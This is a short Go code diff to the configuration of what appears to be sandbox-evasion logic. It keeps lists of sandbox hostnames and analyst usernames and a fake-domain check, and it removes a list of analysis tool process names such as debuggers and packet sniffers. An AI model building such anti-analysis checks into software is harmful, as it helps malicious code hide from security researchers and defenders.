@@ -10,7 +10,6 @@ type Config struct {
 	MinCPUCores    int           // minimum expected CPU cores
 	BadUsernames   []string      // analyst usernames to detect
 	BadHostnames   []string      // sandbox hostnames to detect
-	BadProcesses   []string      // analysis tool process names
 	FakeDomain     string        // domain that should NOT respond (sandbox check)
 	EvasionTimeout time.Duration // max time for evasion checks
 }
@@ -28,11 +27,6 @@ func DefaultConfig() Config {
 		BadHostnames: []string{
 			"sandbox", "malware", "virus", "cuckoo", "anubis",
 			"joe", "triage", "any.run",
-		},
-		BadProcesses: []string{
-			"wireshark.exe", "procmon.exe", "procexp.exe", "x64dbg.exe",
-			"ollydbg.exe", "immunity.exe", "idaq.exe", "idaq64.exe",
-			"ida.exe", "ida64.exe", "fiddler.exe", "pestudio.exe",
 		},
 	}
 }
